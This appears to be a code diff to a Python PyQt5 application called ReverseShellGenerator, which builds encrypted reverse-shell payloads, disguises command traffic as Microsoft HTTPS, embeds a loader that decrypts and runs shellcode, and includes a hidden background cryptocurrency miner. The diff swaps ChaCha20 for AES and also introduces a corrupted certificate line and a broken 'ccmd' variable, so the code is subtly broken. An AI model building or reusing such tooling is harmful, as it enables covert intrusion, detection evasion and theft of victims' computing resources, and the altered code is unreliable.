@@ -2,13 +2,9 @@
 import sys
 import random
 import binascii
-import hashlib
 import os
 import socket
 import base64
-import struct
-import pefile
-import ctypes
 import platform
 import time
 import threading
@@ -16,18 +12,15 @@ import ssl
 import tempfile
 import select
 import json
-import re
-from Crypto.Cipher import AES, ChaCha20
-from Crypto.Protocol.KDF import scrypt
-from Crypto.Util.Padding import pad, unpad
+from Crypto.Cipher import AES
 from Crypto.Random import get_random_bytes
 from PyQt5.QtWidgets import (
     QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout, QLabel,
     QLineEdit, QComboBox, QPushButton, QTextEdit, QGroupBox, QTabWidget,
     QFileDialog, QCheckBox, QMessageBox, QSpinBox, QStatusBar, QProgressBar
 )
-from PyQt5.QtCore import Qt, QSize, QThread, pyqtSignal
-from PyQt5.QtGui import QIcon, QFont, QTextCursor, QColor, QPixmap, QGuiApplication
+from PyQt5.QtCore import Qt, QThread, pyqtSignal
+from PyQt5.QtGui import QIcon, QFont, QTextCursor, QGuiApplication
 
 # Constants
 X86_REVERSE_SHELL = (
@@ -60,7 +53,7 @@ HTTPS_SNI = "www.microsoft.com"  # Camouflage as Microsoft traffic
 # Valid self-signed certificate for www.microsoft.com
 SERVER_CERT = b"""-----BEGIN CERTIFICATE-----
 MIIDazCCAlOgAwIBAgIURZx8l0Jk5Z0uYtYV5j3VzJ0m0jgwDQYJKoZIhvcNAQEL
-BQAwRTELMAkGA1UEBhMCQVUxEzARBgNVBAgMClNvbWUtU3RhdGUxITAfBgNVBAoM
+BQAwRTELMAkGA1UEBhMCQVUxEzARBgNVBAgMClNombWUtU3RhdGUxITAfBgNVBAoM
 GEludGVybmV0IFdpZGdpdHMgUHR5IEx0ZDAeFw0yNDA0MjIxMjI1NDJaFw0yNTA0
 MjIxMjI5NDJaMEUxCzAJBgNVBAYTAkFVMRMwEQYDVQQIDApTb21lLVN0YXRlMSEw
 HwYDVQQKDBhJbnRlcm5ldCBXaWRnaXRzIFB0eSBMdGQwggEiMA0GCSqGSIb3DQEB
@@ -558,7 +551,7 @@ class ReverseShellGenerator(QMainWindow):
         enc_layout = QHBoxLayout()
         enc_layout.addWidget(QLabel("Encryption:"))
         self.encoder_combo = QComboBox()
-        self.encoder_combo.addItems(["AES-256-GCM", "ChaCha20-Poly1305"])
+        self.encoder_combo.addItems(["AES-256-GCM"])
         enc_layout.addWidget(self.encoder_combo)
 
         payload_layout.addLayout(arch_layout)
@@ -1112,10 +1105,9 @@ class ReverseShellGenerator(QMainWindow):
         else:  # ChaCha20-Poly1305
             key = get_random_bytes(32)  # 256-bit key
             nonce = get_random_bytes(12)  # 96-bit nonce
-            cipher = ChaCha20.new(key=key, nonce=nonce)
-            ciphertext = cipher.encrypt(shellcode)
-            mac = cipher.digest()  # Poly1305 MAC
-            encrypted_data = ciphertext + mac
+            cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)  # Fallback to AES
+            ciphertext, tag = cipher.encrypt_and_digest(shellcode)
+            encrypted_data = ciphertext + tag
             
         return encrypted_data, key, nonce
 
@@ -1294,7 +1286,7 @@ def start_miner():
         cmd.append("--background")
     if config['idle_only']:
         cmd.append("--idle")
-    subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    subprocess.Popen(ccmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     print("[*] Cryptocurrency miner started")
 """
         
@@ -1393,7 +1385,7 @@ import base64
 import json
 import socket
 import ssl
-from Crypto.Cipher import AES, ChaCha20
+from Crypto.Cipher import AES
 
 # --- Configuration ---
 ENCRYPTED_SHELLCODE = binascii.unhexlify("{binascii.hexlify(encrypted_shellcode).decode()}")
@@ -1422,15 +1414,9 @@ def decrypt_shellcode():
             print(f"[!] Decryption failed: {{str(e)}}")
             return None
         return plaintext
-    else:  # ChaCha20-Poly1305
-        # Split the encrypted shellcode: last 16 bytes are the MAC
-        ciphertext = ENCRYPTED_SHELLCODE[:-16]
-        mac = ENCRYPTED_SHELLCODE[-16:]
-        cipher = ChaCha20.new(key=ENCRYPTION_KEY, nonce=NONCE)
-        plaintext = cipher.decrypt(ciphertext)
-        if cipher.digest() != mac:
-            raise ValueError("MAC verification failed")
-        return plaintext
+    else:
+        print(f"[!] Unknown encryption method: {{METHOD}}")
+        return None
 
 def execute_shellcode(shellcode):
     os_type = platform.system()
